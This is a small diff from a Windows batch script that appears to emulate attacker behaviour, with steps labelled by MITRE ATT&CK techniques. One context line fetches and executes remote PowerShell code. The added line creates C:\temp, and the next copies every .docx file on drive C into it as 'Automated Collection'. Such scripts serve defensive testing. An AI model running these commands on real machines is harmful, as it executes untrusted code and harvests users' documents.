@@ -83,6 +83,7 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githu
 
 :: Tactic: Collection
 :: Technique: Automated Collection: https://attack.mitre.org/wiki/Technique/T1119
+if not exist "C:\temp\" mkdir C:\temp
 
 for /R c: %%f in (*.docx) do copy %%f c:\temp\
 
